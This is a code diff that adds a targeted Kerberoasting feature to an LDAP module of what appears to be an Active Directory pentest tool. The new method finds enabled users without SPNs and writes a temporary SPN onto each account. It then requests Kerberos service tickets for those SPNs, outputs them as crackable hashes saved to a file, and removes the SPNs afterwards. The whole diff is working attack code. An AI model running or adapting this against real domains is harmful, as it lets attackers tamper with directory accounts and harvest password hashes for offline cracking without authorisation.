@@ -12,6 +12,7 @@ from zipfile import ZipFile
 from termcolor import colored
 from dns import resolver
 from dateutil.relativedelta import relativedelta as rd
+from ldap3 import Server, Connection, NTLM, MODIFY_REPLACE
 
 from Cryptodome.Hash import MD4
 from OpenSSL.SSL import SysCallError
@@ -1162,6 +1163,101 @@ class ldap(connection):
                         self.logger.fail(f"Principal: {downLevelLogonName} - {e}")
                 else:
                     self.logger.fail(f"Error retrieving TGT for {self.domain}\\{self.username} from {self.kdcHost}")
+
+    def targetedkerberoast(self):
+        searchFilter = "(&(objectCategory=person)(!(servicePrincipalName=*)))"
+        attributes = ["distinguishedName", "sAMAccountName", "userAccountControl"]
+        self.logger.debug(f"Search Filter: {searchFilter}")
+        resp = self.search(searchFilter, attributes, 0)
+        resp_parsed = parse_result_attributes(resp)
+
+        if not resp_parsed:
+            self.logger.highlight("No users without SPN found.")
+            return
+
+        enabled_users = [u for u in resp_parsed if not int(u["userAccountControl"]) & 0x2]
+        self.logger.display(f"Found {len(enabled_users)} enabled users without SPN.")
+
+        hashes = []
+        successful_targets = []
+        buffered_logs = []
+
+        try:
+            server = Server(self.host, get_info=None)
+            conn = Connection(
+                server,
+                user=f"{self.domain}\\{self.username}",
+                password=self.password,
+                authentication=NTLM,
+                auto_bind=True,
+            )
+        except Exception as e:
+            self.logger.fail(f"Failed to bind with ldap3: {e}")
+            return
+
+        for user in enabled_users:
+            dn = user["distinguishedName"]
+            sam = user["sAMAccountName"]
+            temp_spn = f"test/{sam}"
+            try:
+                self.logger.debug(f"Trying to add SPN {temp_spn} to {sam}")
+                if not conn.modify(dn, {"servicePrincipalName": [(MODIFY_REPLACE, [temp_spn])]}):
+                    buffered_logs.append(("debug", f"Failed to add SPN for {sam}: {conn.result}"))
+                    continue
+                buffered_logs.append(("success", f"SPN added successfully for {sam}"))
+
+                TGT = KerberosAttacks(self).get_tgt_kerberoasting(self.use_kcache)
+                if not TGT:
+                    buffered_logs.append(("fail", f"Could not get TGT for SPN injection on {sam}"))
+                    continue
+
+                principalName = Principal()
+                principalName.type = constants.PrincipalNameType.NT_SRV_INST.value
+                principalName.components = temp_spn.split("/")
+
+                tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(
+                    principalName,
+                    self.domain,
+                    self.kdcHost,
+                    TGT["KDC_REP"],
+                    TGT["cipher"],
+                    TGT["sessionKey"],
+                )
+
+                hash_str = KerberosAttacks(self).output_tgs(
+                    tgs,
+                    oldSessionKey,
+                    sessionKey,
+                    sam,
+                    temp_spn,
+                )
+
+                hashes.append(hash_str)
+                successful_targets.append((dn, sam))
+                buffered_logs.append(("highlight", hash_str))
+
+                if self.args.targetedkerberoast:
+                    with open(self.args.targetedkerberoast, "a", encoding="utf-8") as f:
+                        f.write(hash_str + "\n")
+
+                if conn.modify(dn, {"servicePrincipalName": [(MODIFY_REPLACE, [])]}):
+                    buffered_logs.append(("success", f"SPN removed successfully for {sam}"))
+                else:
+                    buffered_logs.append(("debug", f"Failed to remove SPN for {sam}: {conn.result}"))
+
+            except Exception as e:
+                buffered_logs.append(("fail", f"Error for {sam}: {e}"))
+                self.logger.debug("Traceback", exc_info=True)
+
+        self.logger.display(f"Total of records returned: {len(successful_targets)}")
+
+        for level, msg in buffered_logs:
+            getattr(self.logger, level)(msg)
+
+        try:
+            conn.unbind()
+        except:
+            pass
 
     def query(self):
         """
